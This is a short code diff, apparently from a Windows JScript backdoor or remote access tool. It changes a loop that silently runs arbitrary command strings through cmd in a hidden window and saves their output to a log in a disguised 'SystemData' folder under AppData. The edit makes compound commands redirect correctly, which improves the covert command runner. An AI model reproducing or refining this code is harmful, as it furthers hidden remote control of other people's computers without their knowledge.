@@ -59,7 +59,7 @@ while(true){
 		}
 		try{
 			if(fs.FileExists(appdata+"\\SystemData\\cmd.log")) fs.DeleteFile(appdata+"\\SystemData\\cmd.log");
-			shell.Run('cmd /c "'+text+' > %localappdata%\\SystemData\\cmd.log"', 0);
+			shell.Run('cmd /c "( '+text+' ) > %localappdata%\\SystemData\\cmd.log"', 0);
 		}catch(e){
 			continue;
 		}
